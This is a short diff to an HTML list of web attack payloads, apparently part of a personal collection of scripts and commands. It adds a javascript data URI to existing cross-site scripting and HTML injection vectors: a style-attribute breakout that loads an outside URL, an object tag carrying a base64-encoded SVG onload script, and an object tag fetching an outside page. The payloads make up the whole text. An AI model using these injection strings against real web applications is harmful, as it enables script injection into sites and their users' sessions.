@@ -60,4 +60,5 @@ few scripts and useful commands
 <li> " style="background-image: url(http://blabla.com) </li>
 <li> &lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+>&lt;/object> </li>
 <li> &lt;object data=http://blabla.com>&lt;/object> </li>
+<li> data:text/javascript,alert(0) </li>
 </ul>
